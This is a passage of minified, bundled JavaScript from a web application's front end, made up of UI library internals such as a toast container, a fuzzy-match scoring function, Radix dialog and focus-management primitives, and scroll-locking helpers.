    return c.createElement(rw, {
      className: e.className,
      style: {
        ...o,
        ...n,
        ...e.style
      }
    }, "function" == typeof r ? r({
      icon: i,
      message: l
    }) : c.createElement(c.Fragment, null, i, l));
  });
b1(c.createElement);
var sw = ({
    id: e,
    className: t,
    style: n,
    onHeightUpdate: r,
    children: o
  }) => {
    let i = c.useCallback(l => {
      if (l) {
        let s = () => {
          let a = l.getBoundingClientRect().height;
          r(e, a);
        };
        s(), new MutationObserver(s).observe(l, {
          subtree: !0,
          childList: !0,
          characterData: !0
        });
      }
    }, [e, r]);
    return c.createElement("div", {
      ref: i,
      className: t,
      style: n
    }, o);
  },
  aw = (e, t) => {
    let n = e.includes("top"),
      r = n ? {
        top: 0
      } : {
        bottom: 0
      },
      o = e.includes("center") ? {
        justifyContent: "center"
      } : e.includes("right") ? {
        justifyContent: "flex-end"
      } : {};
    return {
      left: 0,
      right: 0,
      display: "flex",
      position: "absolute",
      transition: iv() ? void 0 : "all 230ms cubic-bezier(.21,1.02,.73,1)",
      transform: `translateY(${t * (n ? 1 : -1)}px)`,
      ...r,
      ...o
    };
  },
  uw = jl`
  z-index: 9999;
  > * {
    pointer-events: auto;
  }
`,
  fi = 16,
  cw = ({
    reverseOrder: e,
    position: t = "top-center",
    toastOptions: n,
    gutter: r,
    children: o,
    containerStyle: i,
    containerClassName: l
  }) => {
    let {
      toasts: s,
      handlers: a
    } = j1(n);
    return c.createElement("div", {
      style: {
        position: "fixed",
        zIndex: 9999,
        top: fi,
        left: fi,
        right: fi,
        bottom: fi,
        pointerEvents: "none",
        ...i
      },
      className: l,
      onMouseEnter: a.startPause,
      onMouseLeave: a.endPause
    }, s.map(u => {
      let d = u.position || t,
        f = a.calculateOffset(u, {
          reverseOrder: e,
          gutter: r,
          defaultPosition: t
        }),
        v = aw(d, f);
      return c.createElement(sw, {
        id: u.id,
        key: u.id,
        onHeightUpdate: a.updateHeight,
        className: u.visible ? uw : "",
        style: v
      }, "custom" === u.type ? dl(u.message, u) : o ? o(u) : c.createElement(lw, {
        toast: u,
        position: d
      }));
    }));
  },
  Kd = ze,
  Gd = 1,
  dw = .9,
  fw = .8,
  pw = .17,
  Es = .1,
  Cs = .999,
  mw = .9999,
  vw = .99,
  hw = /[\\\/_+.#"@\[\(\{&]/,
  gw = /[\\\/_+.#"@\[\(\{&]/g,
  yw = /[\s-]/,
  lv = /[\s-]/g;
function za(e, t, n, r, o, i, l) {
  if (i === t.length) return o === e.length ? Gd : vw;
  var s = `${o},${i}`;
  if (void 0 !== l[s]) return l[s];
  for (var f, v, g, x, a = r.charAt(i), u = n.indexOf(a, o), d = 0; u >= 0;) (f = za(e, t, n, r, u + 1, i + 1, l)) > d && (u === o ? f *= Gd : hw.test(e.charAt(u - 1)) ? (f *= fw, (g = e.slice(o, u - 1).match(gw)) && o > 0 && (f *= Math.pow(Cs, g.length))) : yw.test(e.charAt(u - 1)) ? (f *= dw, (x = e.slice(o, u - 1).match(lv)) && o > 0 && (f *= Math.pow(Cs, x.length))) : (f *= pw, o > 0 && (f *= Math.pow(Cs, u - o))), e.charAt(u) !== t.charAt(i) && (f *= mw)), (f < Es && n.charAt(u - 1) === r.charAt(i + 1) || r.charAt(i + 1) === r.charAt(i) && n.charAt(u - 1) !== r.charAt(i)) && (v = za(e, t, n, r, u + 1, i + 2, l)) * Es > f && (f = v * Es), f > d && (d = f), u = n.indexOf(a, u + 1);
  return l[s] = d, d;
}
function Qd(e) {
  return e.toLowerCase().replace(lv, " ");
}
function ww(e, t, n) {
  return za(e = n && n.length > 0 ? "" + (e + " " + n.join(" ")) : e, t, Qd(e), Qd(t), 0, 0, {});
}
function _e() {
  return _e = Object.assign ? Object.assign.bind() : function (e) {
    for (var t = 1; t < arguments.length; t++) {
      var n = arguments[t];
      for (var r in n) ({}).hasOwnProperty.call(n, r) && (e[r] = n[r]);
    }
    return e;
  }, _e.apply(null, arguments);
}
function hr(e, t, {
  checkForDefaultPrevented: n = !0
} = {}) {
  return function (o) {
    if (null == e || e(o), !1 === n || !o.defaultPrevented) return null == t ? void 0 : t(o);
  };
}
function xw(e, t) {
  "function" == typeof e ? e(t) : null != e && (e.current = t);
}
function sv(...e) {
  return t => e.forEach(n => xw(n, t));
}
function Wo(...e) {
  return c.useCallback(sv(...e), e);
}
function Sw(e, t = []) {
  let n = [];
  const o = () => {
    const i = n.map(l => c.createContext(l));
    return function (s) {
      const a = (null == s ? void 0 : s[e]) || i;
      return c.useMemo(() => ({
        [`__scope${e}`]: {
          ...s,
          [e]: a
        }
      }), [s, a]);
    };
  };
  return o.scopeName = e, [function r(i, l) {
    const s = c.createContext(l),
      a = n.length;
    function u(f) {
      const {
          scope: v,
          children: g,
          ...x
        } = f,
        h = (null == v ? void 0 : v[e][a]) || s,
        w = c.useMemo(() => x, Object.values(x));
      return c.createElement(h.Provider, {
        value: w
      }, g);
    }
    return n = [...n, l], u.displayName = i + "Provider", [u, function d(f, v) {
      const g = (null == v ? void 0 : v[e][a]) || s,
        x = c.useContext(g);
      if (x) return x;
      if (void 0 !== l) return l;
      throw new Error(`\`${f}\` must be used within \`${i}\``);
    }];
  }, Ew(o, ...t)];
}
function Ew(...e) {
  const t = e[0];
  if (1 === e.length) return t;
  const n = () => {
    const r = e.map(o => ({
      useScope: o(),
      scopeName: o.scopeName
    }));
    return function (i) {
      const l = r.reduce((s, {
        useScope: a,
        scopeName: u
      }) => ({
        ...s,
        ...a(i)[`__scope${u}`]
      }), {});
      return c.useMemo(() => ({
        [`__scope${t.scopeName}`]: l
      }), [l]);
    };
  };
  return n.scopeName = t.scopeName, n;
}
const Fa = null != globalThis && globalThis.document ? c.useLayoutEffect : () => {},
  Cw = Jf.useId || (() => {});
let kw = 0;
function ks(e) {
  const [t, n] = c.useState(Cw());
  return Fa(() => {
    e || n(r => r !== null && r !== void 0 ? r : String(kw++));
  }, [e]), e || (t ? `radix-${t}` : "");
}
function An(e) {
  const t = c.useRef(e);
  return c.useEffect(() => {
    t.current = e;
  }), c.useMemo(() => (...n) => {
    var r;
    return null === (r = t.current) || void 0 === r ? void 0 : r.call(t, ...n);
  }, []);
}
function Pw({
  prop: e,
  defaultProp: t,
  onChange: n = () => {}
}) {
  const [r, o] = _w({
      defaultProp: t,
      onChange: n
    }),
    i = void 0 !== e,
    l = i ? e : r,
    s = An(n);
  return [l, c.useCallback(u => {
    if (i) {
      const f = "function" == typeof u ? u(e) : u;
      f !== e && s(f);
    } else o(u);
  }, [i, e, o, s])];
}
function _w({
  defaultProp: e,
  onChange: t
}) {
  const n = c.useState(e),
    [r] = n,
    o = c.useRef(r),
    i = An(t);
  return c.useEffect(() => {
    o.current !== r && (i(r), o.current = r);
  }, [r, o, i]), n;
}
const rc = c.forwardRef((e, t) => {
  const {
      children: n,
      ...r
    } = e,
    o = c.Children.toArray(n),
    i = o.find(Nw);
  if (i) {
    const l = i.props.children,
      s = o.map(a => a === i ? c.Children.count(l) > 1 ? c.Children.only(null) : c.isValidElement(l) ? l.props.children : null : a);
    return c.createElement(Ua, _e({}, r, {
      ref: t
    }), c.isValidElement(l) ? c.cloneElement(l, void 0, s) : null);
  }
  return c.createElement(Ua, _e({}, r, {
    ref: t
  }), n);
});
rc.displayName = "Slot";
const Ua = c.forwardRef((e, t) => {
  const {
    children: n,
    ...r
  } = e;
  return c.isValidElement(n) ? c.cloneElement(n, {
    ...$w(r, n.props),
    ref: t ? sv(t, n.ref) : n.ref
  }) : c.Children.count(n) > 1 ? c.Children.only(null) : null;
});
Ua.displayName = "SlotClone";
const bw = ({
  children: e
}) => c.createElement(c.Fragment, null, e);
function Nw(e) {
  return c.isValidElement(e) && e.type === bw;
}
function $w(e, t) {
  const n = {
    ...t
  };
  for (const r in t) {
    const o = e[r],
      i = t[r];
    /^on[A-Z]/.test(r) ? o && i ? n[r] = (...s) => {
      i(...s), o(...s);
    } : o && (n[r] = o) : "style" === r ? n[r] = {
      ...o,
      ...i
    } : "className" === r && (n[r] = [o, i].filter(Boolean).join(" "));
  }
  return {
    ...e,
    ...n
  };
}
const Rw = ["a", "button", "div", "form", "h2", "h3", "img", "input", "label", "li", "nav", "ol", "p", "span", "svg", "ul"],
  et = Rw.reduce((e, t) => {
    const n = c.forwardRef((r, o) => {
      const {
          asChild: i,
          ...l
        } = r,
        s = i ? rc : t;
      return c.useEffect(() => {
        window[Symbol.for("radix-ui")] = !0;
      }, []), c.createElement(s, _e({}, l, {
        ref: o
      }));
    });
    return n.displayName = `Primitive.${t}`, {
      ...e,
      [t]: n
    };
  }, {});
function Ow(e, t) {
  e && Un.flushSync(() => e.dispatchEvent(t));
}
function Aw(e, t = null == globalThis ? void 0 : globalThis.document) {
  const n = An(e);
  c.useEffect(() => {
    const r = o => {
      "Escape" === o.key && n(o);
    };
    return t.addEventListener("keydown", r), () => t.removeEventListener("keydown", r);
  }, [n, t]);
}
const Wa = "dismissableLayer.update",
  Tw = "dismissableLayer.pointerDownOutside",
  Dw = "dismissableLayer.focusOutside";
let Yd;
const Iw = c.createContext({
    layers: new Set(),
    layersWithOutsidePointerEventsDisabled: new Set(),
    branches: new Set()
  }),
  Mw = c.forwardRef((e, t) => {
    var n;
    const {
        disableOutsidePointerEvents: r = !1,
        onEscapeKeyDown: o,
        onPointerDownOutside: i,
        onFocusOutside: l,
        onInteractOutside: s,
        onDismiss: a,
        ...u
      } = e,
      d = c.useContext(Iw),
      [f, v] = c.useState(null),
      g = null !== (n = null == f ? void 0 : f.ownerDocument) && void 0 !== n ? n : null == globalThis ? void 0 : globalThis.document,
      [, x] = c.useState({}),
      h = Wo(t, b => v(b)),
      w = Array.from(d.layers),
      [m] = [...d.layersWithOutsidePointerEventsDisabled].slice(-1),
      p = w.indexOf(m),
      y = f ? w.indexOf(f) : -1,
      S = d.layersWithOutsidePointerEventsDisabled.size > 0,
      C = y >= p,
      P = Lw(b => {
        const T = b.target,
          O = [...d.branches].some(U => U.contains(T));
        !C || O || (null == i || i(b), null == s || s(b), b.defaultPrevented || null == a || a());
      }, g),
      k = jw(b => {
        const T = b.target;
        [...d.branches].some(U => U.contains(T)) || (null == l || l(b), null == s || s(b), b.defaultPrevented || null == a || a());
      }, g);
    return Aw(b => {
      y === d.layers.size - 1 && (null == o || o(b), !b.defaultPrevented && a && (b.preventDefault(), a()));
    }, g), c.useEffect(() => {
      if (f) return r && (0 === d.layersWithOutsidePointerEventsDisabled.size && (Yd = g.body.style.pointerEvents, g.body.style.pointerEvents = "none"), d.layersWithOutsidePointerEventsDisabled.add(f)), d.layers.add(f), Xd(), () => {
        r && 1 === d.layersWithOutsidePointerEventsDisabled.size && (g.body.style.pointerEvents = Yd);
      };
    }, [f, g, r, d]), c.useEffect(() => () => {
      f && (d.layers.delete(f), d.layersWithOutsidePointerEventsDisabled.delete(f), Xd());
    }, [f, d]), c.useEffect(() => {
      const b = () => x({});
      return document.addEventListener(Wa, b), () => document.removeEventListener(Wa, b);
    }, []), c.createElement(et.div, _e({}, u, {
      ref: h,
      style: {
        pointerEvents: S ? C ? "auto" : "none" : void 0,
        ...e.style
      },
      onFocusCapture: hr(e.onFocusCapture, k.onFocusCapture),
      onBlurCapture: hr(e.onBlurCapture, k.onBlurCapture),
      onPointerDownCapture: hr(e.onPointerDownCapture, P.onPointerDownCapture)
    }));
  });
function Lw(e, t = null == globalThis ? void 0 : globalThis.document) {
  const n = An(e),
    r = c.useRef(!1),
    o = c.useRef(() => {});
  return c.useEffect(() => {
    const i = s => {
        if (s.target && !r.current) {
          let d = function () {
            av(Tw, n, u, {
              discrete: !0
            });
          };
          const u = {
            originalEvent: s
          };
          "touch" === s.pointerType ? (t.removeEventListener("click", o.current), o.current = d, t.addEventListener("click", o.current, {
            once: !0
          })) : d();
        } else t.removeEventListener("click", o.current);
        r.current = !1;
      },
      l = window.setTimeout(() => {
        t.addEventListener("pointerdown", i);
      }, 0);
    return () => {
      window.clearTimeout(l), t.removeEventListener("pointerdown", i), t.removeEventListener("click", o.current);
    };
  }, [t, n]), {
    onPointerDownCapture: () => r.current = !0
  };
}
function jw(e, t = null == globalThis ? void 0 : globalThis.document) {
  const n = An(e),
    r = c.useRef(!1);
  return c.useEffect(() => {
    const o = i => {
      i.target && !r.current && av(Dw, n, {
        originalEvent: i
      }, {
        discrete: !1
      });
    };
    return t.addEventListener("focusin", o), () => t.removeEventListener("focusin", o);
  }, [t, n]), {
    onFocusCapture: () => r.current = !0,
    onBlurCapture: () => r.current = !1
  };
}
function Xd() {
  const e = new CustomEvent(Wa);
  document.dispatchEvent(e);
}
function av(e, t, n, {
  discrete: r
}) {
  const o = n.originalEvent.target,
    i = new CustomEvent(e, {
      bubbles: !1,
      cancelable: !0,
      detail: n
    });
  t && o.addEventListener(e, t, {
    once: !0
  }), r ? Ow(o, i) : o.dispatchEvent(i);
}
const Ps = "focusScope.autoFocusOnMount",
  _s = "focusScope.autoFocusOnUnmount",
  Zd = {
    bubbles: !1,
    cancelable: !0
  },
  zw = c.forwardRef((e, t) => {
    const {
        loop: n = !1,
        trapped: r = !1,
        onMountAutoFocus: o,
        onUnmountAutoFocus: i,
        ...l
      } = e,
      [s, a] = c.useState(null),
      u = An(o),
      d = An(i),
      f = c.useRef(null),
      v = Wo(t, h => a(h)),
      g = c.useRef({
        paused: !1,
        pause() {
          this.paused = !0;
        },
        resume() {
          this.paused = !1;
        }
      }).current;
    c.useEffect(() => {
      if (r) {
        let p = function (P) {
            if (g.paused || !s) return;
            const k = P.target;
            s.contains(k) ? f.current = k : Wt(f.current, {
              select: !0
            });
          },
          y = function (P) {
            if (g.paused || !s) return;
            const k = P.relatedTarget;
            null !== k && (s.contains(k) || Wt(f.current, {
              select: !0
            }));
          },
          S = function (P) {
            if (document.activeElement === document.body) for (const b of P) b.removedNodes.length > 0 && Wt(s);
          };
        document.addEventListener("focusin", p), document.addEventListener("focusout", y);
        const C = new MutationObserver(S);
        return s && C.observe(s, {
          childList: !0,
          subtree: !0
        }), () => {
          document.removeEventListener("focusin", p), document.removeEventListener("focusout", y), C.disconnect();
        };
      }
    }, [r, s, g.paused]), c.useEffect(() => {
      if (s) {
        qd.add(g);
        const h = document.activeElement;
        if (!s.contains(h)) {
          const m = new CustomEvent(Ps, Zd);
          s.addEventListener(Ps, u), s.dispatchEvent(m), m.defaultPrevented || (Fw(Hw(uv(s)), {
            select: !0
          }), document.activeElement === h && Wt(s));
        }
        return () => {
          s.removeEventListener(Ps, u), setTimeout(() => {
            const m = new CustomEvent(_s, Zd);
            s.addEventListener(_s, d), s.dispatchEvent(m), m.defaultPrevented || Wt(h !== null && h !== void 0 ? h : document.body, {
              select: !0
            }), s.removeEventListener(_s, d), qd.remove(g);
          }, 0);
        };
      }
    }, [s, u, d, g]);
    const x = c.useCallback(h => {
      if (!n && !r || g.paused) return;
      const w = "Tab" === h.key && !h.altKey && !h.ctrlKey && !h.metaKey,
        m = document.activeElement;
      if (w && m) {
        const p = h.currentTarget,
          [y, S] = Uw(p);
        y && S ? h.shiftKey || m !== S ? h.shiftKey && m === y && (h.preventDefault(), n && Wt(S, {
          select: !0
        })) : (h.preventDefault(), n && Wt(y, {
          select: !0
        })) : m === p && h.preventDefault();
      }
    }, [n, r, g.paused]);
    return c.createElement(et.div, _e({
      tabIndex: -1
    }, l, {
      ref: v,
      onKeyDown: x
    }));
  });
function Fw(e, {
  select: t = !1
} = {}) {
  const n = document.activeElement;
  for (const r of e) if (Wt(r, {
    select: t
  }), document.activeElement !== n) return;
}
function Uw(e) {
  const t = uv(e);
  return [Jd(t, e), Jd(t.reverse(), e)];
}
function uv(e) {
  const t = [],
    n = document.createTreeWalker(e, NodeFilter.SHOW_ELEMENT, {
      acceptNode: r => {
        const o = "INPUT" === r.tagName && "hidden" === r.type;
        return r.disabled || r.hidden || o ? NodeFilter.FILTER_SKIP : r.tabIndex >= 0 ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_SKIP;
      }
    });
  for (; n.nextNode();) t.push(n.currentNode);
  return t;
}
function Jd(e, t) {
  for (const n of e) if (!Ww(n, {
    upTo: t
  })) return n;
}
function Ww(e, {
  upTo: t
}) {
  if ("hidden" === getComputedStyle(e).visibility) return !0;
  for (; e;) {
    if (void 0 !== t && e === t) return !1;
    if ("none" === getComputedStyle(e).display) return !0;
    e = e.parentElement;
  }
  return !1;
}
function Bw(e) {
  return e instanceof HTMLInputElement && "select" in e;
}
function Wt(e, {
  select: t = !1
} = {}) {
  if (e && e.focus) {
    const n = document.activeElement;
    e.focus({
      preventScroll: !0
    }), e !== n && Bw(e) && t && e.select();
  }
}
const qd = Vw();
function Vw() {
  let e = [];
  return {
    add(t) {
      const n = e[0];
      t !== n && (null == n || n.pause()), e = ef(e, t), e.unshift(t);
    },
    remove(t) {
      var n;
      e = ef(e, t), null === (n = e[0]) || void 0 === n || n.resume();
    }
  };
}
function ef(e, t) {
  const n = [...e],
    r = n.indexOf(t);
  return -1 !== r && n.splice(r, 1), n;
}
function Hw(e) {
  return e.filter(t => "A" !== t.tagName);
}
const Kw = c.forwardRef((e, t) => {
  var n;
  const {
    container: r = null == globalThis || null === (n = globalThis.document) || void 0 === n ? void 0 : n.body,
    ...o
  } = e;
  return r ? tv.createPortal(c.createElement(et.div, _e({}, o, {
    ref: t
  })), r) : null;
});
function Gw(e, t) {
  return c.useReducer((n, r) => {
    var _t$n$r;
    return (_t$n$r = t[n][r]) !== null && _t$n$r !== void 0 ? _t$n$r : n;
  }, e);
}
const zl = e => {
  const {
      present: t,
      children: n
    } = e,
    r = Qw(t),
    o = "function" == typeof n ? n({
      present: r.isPresent
    }) : c.Children.only(n),
    i = Wo(r.ref, o.ref);
  return "function" == typeof n || r.isPresent ? c.cloneElement(o, {
    ref: i
  }) : null;
};
function Qw(e) {
  const [t, n] = c.useState(),
    r = c.useRef({}),
    o = c.useRef(e),
    i = c.useRef("none"),
    l = e ? "mounted" : "unmounted",
    [s, a] = Gw(l, {
      mounted: {
        UNMOUNT: "unmounted",
        ANIMATION_OUT: "unmountSuspended"
      },
      unmountSuspended: {
        MOUNT: "mounted",
        ANIMATION_END: "unmounted"
      },
      unmounted: {
        MOUNT: "mounted"
      }
    });
  return c.useEffect(() => {
    const u = pi(r.current);
    i.current = "mounted" === s ? u : "none";
  }, [s]), Fa(() => {
    const u = r.current,
      d = o.current;
    if (d !== e) {
      const v = i.current,
        g = pi(u);
      e ? a("MOUNT") : "none" === g || "none" === (null == u ? void 0 : u.display) ? a("UNMOUNT") : a(d && v !== g ? "ANIMATION_OUT" : "UNMOUNT"), o.current = e;
    }
  }, [e, a]), Fa(() => {
    if (t) {
      const u = f => {
          const g = pi(r.current).includes(f.animationName);
          f.target === t && g && Un.flushSync(() => a("ANIMATION_END"));
        },
        d = f => {
          f.target === t && (i.current = pi(r.current));
        };
      return t.addEventListener("animationstart", d), t.addEventListener("animationcancel", u), t.addEventListener("animationend", u), () => {
        t.removeEventListener("animationstart", d), t.removeEventListener("animationcancel", u), t.removeEventListener("animationend", u);
      };
    }
    a("ANIMATION_END");
  }, [t, a]), {
    isPresent: ["mounted", "unmountSuspended"].includes(s),
    ref: c.useCallback(u => {
      u && (r.current = getComputedStyle(u)), n(u);
    }, [])
  };
}
function pi(e) {
  return (null == e ? void 0 : e.animationName) || "none";
}
zl.displayName = "Presence";
let bs = 0;
function Yw() {
  c.useEffect(() => {
    var e, t;
    const n = document.querySelectorAll("[data-radix-focus-guard]");
    return document.body.insertAdjacentElement("afterbegin", null !== (e = n[0]) && void 0 !== e ? e : tf()), document.body.insertAdjacentElement("beforeend", null !== (t = n[1]) && void 0 !== t ? t : tf()), bs++, () => {
      1 === bs && document.querySelectorAll("[data-radix-focus-guard]").forEach(r => r.remove()), bs--;
    };
  }, []);
}
function tf() {
  const e = document.createElement("span");
  return e.setAttribute("data-radix-focus-guard", ""), e.tabIndex = 0, e.style.cssText = "outline: none; opacity: 0; position: fixed; pointer-events: none", e;
}
var Se = function () {
  return Se = Object.assign || function (t) {
    for (var n, r = 1, o = arguments.length; r < o; r++) for (var i in n = arguments[r]) Object.prototype.hasOwnProperty.call(n, i) && (t[i] = n[i]);
    return t;
  }, Se.apply(this, arguments);
};
function oc(e, t) {
  var n = {};
  for (var r in e) Object.prototype.hasOwnProperty.call(e, r) && t.indexOf(r) < 0 && (n[r] = e[r]);
  if (null != e && "function" == typeof Object.getOwnPropertySymbols) {
    var o = 0;
    for (r = Object.getOwnPropertySymbols(e); o < r.length; o++) t.indexOf(r[o]) < 0 && Object.prototype.propertyIsEnumerable.call(e, r[o]) && (n[r[o]] = e[r[o]]);
  }
  return n;
}
function cv(e, t, n) {
  if (n || 2 === arguments.length) for (var i, r = 0, o = t.length; r < o; r++) (i || !(r in t)) && (i || (i = Array.prototype.slice.call(t, 0, r)), i[r] = t[r]);
  return e.concat(i || Array.prototype.slice.call(t));
}
var uo = "right-scroll-bar-position",
  co = "width-before-scroll-bar",
  Xw = "with-scroll-bars-hidden",
  Zw = "--removed-body-scroll-bar-size";
function Ns(e, t) {
  return "function" == typeof e ? e(t) : e && (e.current = t), e;
}
function Jw(e, t) {
  var n = c.useState(function () {
    return {
      value: e,
      callback: t,
      facade: {
        get current() {
          return n.value;
        },
        set current(r) {
          var o = n.value;
          o !== r && (n.value = r, n.callback(r, o));
        }
      }
    };
  })[0];
  return n.callback = t, n.facade;
}
var qw = typeof window < "u" ? c.useLayoutEffect : c.useEffect,
  nf = new WeakMap();
function dv(e, t) {
  var n = Jw(null, function (r) {
    return e.forEach(function (o) {
      return Ns(o, r);
    });
  });
  return qw(function () {
    var r = nf.get(n);
    if (r) {
      var o = new Set(r),
        i = new Set(e),
        l = n.current;
      o.forEach(function (s) {
        i.has(s) || Ns(s, null);
      }), i.forEach(function (s) {
        o.has(s) || Ns(s, l);
      });
    }
    nf.set(n, e);
  }, [e]), n;
}
function ex(e) {
  return e;
}
function tx(e, t) {
  void 0 === t && (t = ex);
  var n = [],
    r = !1;
  return {
    read: function () {
      if (r) throw new Error("Sidecar: could not `read` from an `assigned` medium. `read` could be used only with `useMedium`.");
      return n.length ? n[n.length - 1] : e;
    },
    useMedium: function (i) {
      var l = t(i, r);
      return n.push(l), function () {
        n = n.filter(function (s) {
          return s !== l;
        });
      };
    },
    assignSyncMedium: function (i) {
      for (r = !0; n.length;) {
        var l = n;
        n = [], l.forEach(i);
      }
      n = {
        push: function (s) {
          return i(s);
        },
        filter: function () {
          return n;
        }
      };
    },
    assignMedium: function (i) {
      r = !0;
      var l = [];
      if (n.length) {
        var s = n;
        n = [], s.forEach(i), l = n;
      }
      var a = function () {
          var d = l;
          l = [], d.forEach(i);
        },
        u = function () {
          return Promise.resolve().then(a);
        };
      u(), n = {
        push: function (d) {
          l.push(d), u();
        },
        filter: function (d) {
          return l = l.filter(d), n;
        }
      };
    }
  };
}
function fv(e) {
  void 0 === e && (e = {});
  var t = tx(null);
  return t.options = Se({
    async: !0,
    ssr: !1
  }, e), t;
}
var pv = function (e) {
  var t = e.sideCar,
    n = oc(e, ["sideCar"]);
  if (!t) throw new Error("Sidecar: please provide `sideCar` property to import the right car");
  var r = t.read();
  if (!r) throw new Error("Sidecar medium not found");
  return c.createElement(r, Se({}, n));
};
function mv(e, t) {
  return e.useMedium(t), pv;
}
pv.isSideCarExport = !0;
var vv = fv(),
  $s = function () {},
  Fl = c.forwardRef(function (e, t) {
    var n = c.useRef(null),
      r = c.useState({
        onScrollCapture: $s,
        onWheelCapture: $s,
        onTouchMoveCapture: $s
      }),
      o = r[0],
      i = r[1],
      l = e.forwardProps,
      s = e.children,
      a = e.className,
      u = e.removeScrollBar,
      d = e.enabled,
      f = e.shards,
      v = e.sideCar,
      g = e.noIsolation,
      x = e.inert,
      h = e.allowPinchZoom,
      w = e.as,
      m = void 0 === w ? "div" : w,
      p = oc(e, ["forwardProps", "children", "className", "removeScrollBar", "enabled", "shards", "sideCar", "noIsolation", "inert", "allowPinchZoom", "as"]),
      y = v,
      S = dv([n, t]),
      C = Se(Se({}, p), o);
    return c.createElement(c.Fragment, null, d && c.createElement(y, {
      sideCar: vv,
      removeScrollBar: u,
      shards: f,
      noIsolation: g,
      inert: x,
      setCallbacks: i,
      allowPinchZoom: !!h,
      lockRef: n
    }), l ? c.cloneElement(c.Children.only(s), Se(Se({}, C), {
      ref: S
    })) : c.createElement(m, Se({}, C, {
      className: a,
      ref: S
    }), s));
  });
Fl.defaultProps = {
  enabled: !0,
  removeScrollBar: !0,
  inert: !1
}, Fl.classNames = {
  fullWidth: co,
  zeroRight: uo
};
var nx = function () {
  if (typeof __webpack_nonce__ < "u") return __webpack_nonce__;
};
function rx() {
  if (!document) return null;
  var e = document.createElement("style");
  e.type = "text/css";
  var t = nx();
  return t && e.setAttribute("nonce", t), e;
}
function ox(e, t) {
  e.styleSheet ? e.styleSheet.cssText = t : e.appendChild(document.createTextNode(t));
}
function ix(e) {
  (document.head || document.getElementsByTagName("head")[0]).appendChild(e);
}
var lx = function () {
    var e = 0,
      t = null;
    return {
      add: function (n) {
        0 == e && (t = rx()) && (ox(t, n), ix(t)), e++;
      },
      remove: function () {
        ! --e && t && (t.parentNode && t.parentNode.removeChild(t), t = null);
      }
    };
  },
  sx = function () {
    var e = lx();
    return function (t, n) {
      c.useEffect(function () {
        return e.add(t), function () {
          e.remove();
        };
      }, [t && n]);
    };
  },
  ic = function () {
    var e = sx();
    return function (n) {
      var r = n.styles,
        o = n.dynamic;
      return e(r, o), null;
    };
  },
  ax = {
    left: 0,
    top: 0,
    right: 0,
    gap: 0
  },
  Rs = function (e) {
    return parseInt(e || "", 10) || 0;
  },
  ux = function (e) {
    var t = window.getComputedStyle(document.body),
      n = t["padding" === e ? "paddingLeft" : "marginLeft"],
      r = t["padding" === e ? "paddingTop" : "marginTop"],
      o = t["padding" === e ? "paddingRight" : "marginRight"];
    return [Rs(n), Rs(r), Rs(o)];
  },
  cx = function (e) {
    if (void 0 === e && (e = "margin"), typeof window > "u") return ax;
    var t = ux(e),
      n = document.documentElement.clientWidth,
      r = window.innerWidth;
    return {
      left: t[0],
      top: t[1],
      right: t[2],
      gap: Math.max(0, r - n + t[2] - t[0])
    };
  },
  dx = ic(),
  gr = "data-scroll-locked",
  fx = function (e, t, n, r) {
    var o = e.left,
      i = e.top,
      l = e.right,
      s = e.gap;
    return void 0 === n && (n = "margin"), "\n  .".concat(Xw, " {\n   overflow: hidden ").concat(r, ";\n   padding-right: ").concat(s, "px ").concat(r, ";\n  }\n  body[").concat(gr, "] {\n    overflow: hidden ").concat(r, ";\n    overscroll-behavior: contain;\n    ").concat([t && "position: relative ".concat(r, ";"), "margin" === n && "\n    padding-left: ".concat(o, "px;\n    padding-top: ").concat(i, "px;\n    padding-right: ").concat(l, "px;\n    margin-left:0;\n    margin-top:0;\n    margin-right: ").concat(s, "px ").concat(r, ";\n    "), "padding" === n && "padding-right: ".concat(s, "px ").concat(r, ";")].filter(Boolean).join(""), "\n  }\n  \n  .").concat(uo, " {\n    right: ").concat(s, "px ").concat(r, ";\n  }\n  \n  .").concat(co, " {\n    margin-right: ").concat(s, "px ").concat(r, ";\n  }\n  \n  .").concat(uo, " .").concat(uo, " {\n    right: 0 ").concat(r, ";\n  }\n  \n  .").concat(co, " .").concat(co, " {\n    margin-right: 0 ").concat(r, ";\n  }\n  \n  body[").concat(gr, "] {\n    ").concat(Zw, ": ").concat(s, "px;\n  }\n");
  },
  rf = function () {
    var e = parseInt(document.body.getAttribute(gr) || "0", 10);
    return isFinite(e) ? e : 0;
  },
  px = function () {
    c.useEffect(function () {
      return document.body.setAttribute(gr, (rf() + 1).toString()), function () {
        var e = rf() - 1;
        e <= 0 ? document.body.removeAttribute(gr) : document.body.setAttribute(gr, e.toString());
      };
    }, []);
  },
  hv = function (e) {
    var t = e.noRelative,
      n = e.noImportant,
      r = e.gapMode,
      o = void 0 === r ? "margin" : r;
    px();
    var i = c.useMemo(function () {
      return cx(o);
    }, [o]);
    return c.createElement(dx, {
      styles: fx(i, !t, o, n ? "" : "!important")
    });
  },
  Ba = !1;
if (typeof window < "u") try {
  var mi = Object.defineProperty({}, "passive", {
    get: function () {
      return Ba = !0, !0;
    }
  });
  window.addEventListener("test", mi, mi), window.removeEventListener("test", mi, mi);
} catch {
  Ba = !1;
}
var Kn = !!Ba && {
    passive: !1
  },
  mx = function (e) {
    return "TEXTAREA" === e.tagName;
  },
  gv = function (e, t) {
    var n = window.getComputedStyle(e);
    return "hidden" !== n[t] && !(n.overflowY === n.overflowX && !mx(e) && "visible" === n[t]);
  },
  vx = function (e) {
    return gv(e, "overflowY");
  },
  hx = function (e) {
    return gv(e, "overflowX");
  },
  of = function (e, t) {
    var n = t;
    do {
      if (typeof ShadowRoot < "u" && n instanceof ShadowRoot && (n = n.host), yv(e, n)) {
        var o = wv(e, n);
        if (o[1] > o[2]) return !0;
      }
      n = n.parentNode;
    } while (n && n !== document.body);
    return !1;
  },
  gx = function (e) {
    return [e.scrollTop, e.scrollHeight, e.clientHeight];
  },
  yx = function (e) {
    return [e.scrollLeft, e.scrollWidth, e.clientWidth];
  },
  yv = function (e, t) {
    return "v" === e ? vx(t) : hx(t);
  },
  wv = function (e, t) {
    return "v" === e ? gx(t) : yx(t);
  },
  wx = function (e, t) {
    return "h" === e && "rtl" === t ? -1 : 1;
  },
  xx = function (e, t, n, r, o) {
    var i = wx(e, window.getComputedStyle(t).direction),
      l = i * r,
      s = n.target,
      a = t.contains(s),
      u = !1,
      d = l > 0,
      f = 0,
      v = 0;
    do {
      var g = wv(e, s),
        x = g[0],
        m = g[1] - g[2] - i * x;
      (x || m) && yv(e, s) && (f += m, v += x), s = s.parentNode;
    } while (!a && s !== document.body || a && (t.contains(s) || t === s));
